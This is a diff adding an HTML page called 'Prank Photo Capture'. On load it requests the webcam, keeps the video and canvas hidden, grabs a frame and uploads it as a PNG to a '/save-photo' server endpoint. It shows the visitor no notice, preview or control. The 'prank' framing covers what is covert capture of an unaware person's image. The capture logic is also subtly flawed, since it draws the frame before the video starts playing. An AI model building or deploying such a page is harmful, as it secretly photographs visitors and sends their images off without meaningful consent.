@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prank Photo Capture</title>
+</head>
+<body>
+    <h1>Prank Photo Capture</h1>
+    <video id="video" width="640" height="480" style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const constraints = {
+            video: true
+        };
+
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                capturePhoto();
+            } catch (err) {
+                console.error('Error accessing webcam:', err);
+            }
+        }
+
+        function capturePhoto() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+            savePhoto(dataURL);
+        }
+
+        function savePhoto(dataURL) {
+            console.log('Prank photo captured:', dataURL);
+            
+            // Send the photo data to the server
+            fetch('/save-photo', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ photo: dataURL })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Photo saved successfully');
+                } else {
+                    console.error('Failed to save photo:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error saving photo:', error);
+            });
+        }
+
+        initCamera();
+    </script>
+</body>
+</html>
+
